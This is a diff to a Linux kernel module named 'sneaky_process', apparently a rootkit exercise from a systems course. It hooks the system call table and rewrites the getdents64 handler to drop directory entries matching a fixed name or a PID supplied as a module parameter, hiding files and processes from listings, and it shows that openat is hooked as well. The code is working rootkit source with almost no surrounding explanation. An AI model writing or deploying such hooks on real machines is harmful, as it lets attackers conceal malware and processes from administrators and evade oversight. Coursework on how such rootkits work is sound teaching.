@@ -8,6 +8,7 @@
 #include <linux/kernel.h>  // for printk and other kernel bits
 #include <linux/module.h>  // for all modules
 #include <linux/sched.h>
+#include<linux/dirent.h>
 #define PREFIX "sneaky_process"
 
 //This is a pointer to the system call table
@@ -52,38 +53,40 @@ asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
   return (*original_openat)(regs);
 }
 
-typedef struct linux_dirent64 {
-  unsigned long d_ino;
-  off_t d_off;
-  unsigned short d_reclen;
-  char d_type;
-  char d_name[];
-} ld64;
+/* typedef struct linux_dirent64 { */
+/*   unsigned long d_ino; */
+/*   off_t d_off; */
+/*   unsigned short d_reclen; */
+/*   char d_type; */
+/*   char d_name[]; */
+/* } ld64; */
 
-asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
-  int nread = original_getdents64(regs);
-  ld64 * d;
-  int index = 0;
-  while (index < nread) {
-    d = (ld64 *)(regs->si + index);
-    printk(KERN_INFO "The name is: %s, %d, %d, %d",
-           d->d_name,
-           (int)d->d_reclen,
-           nread,
-           index);
-    if (strcmp(d->d_name, PREFIX) == 0) {
-      /* printk(KERN_INFO "Gotcha !, %d", (nread - index - d->d_reclen)); */
-      memmove(d, d + d->d_reclen, nread - index - d->d_reclen);
-      nread -= d->d_reclen;
-    }
-    index += d->d_reclen;
-  }
-  printk(KERN_INFO "Nread now is: %d", nread);
-  return nread;
-}
 
 static char * value = "sdfkasdlfkjasdlkfj";
 module_param(value, charp, 0000);
+
+asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
+  int nread = original_getdents64(regs);
+  struct linux_dirent64 * d;
+  int index = 0;
+  while (index < nread) {
+    d = (struct linux_dirent64 *)((void *)regs->si + index);
+    /* printk(KERN_INFO "The name is: %s, %d, %d, %d", */
+    /*        d->d_name, */
+    /*        (int)d->d_reclen, */
+    /*        nread, */
+    /*        index); */
+    if ((strcmp(d->d_name, PREFIX) == 0) || strcmp(d->d_name, value) == 0) {
+      printk(KERN_INFO "Gotcha !, %d", (nread - index - (int)d->d_reclen));
+      memmove((void*)d, (void *)d + (int)d->d_reclen, nread - index - (int)d->d_reclen);
+      nread -= (int)d->d_reclen;
+    }
+    else{
+      index += d->d_reclen;
+    }
+  }
+  return nread;
+}
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
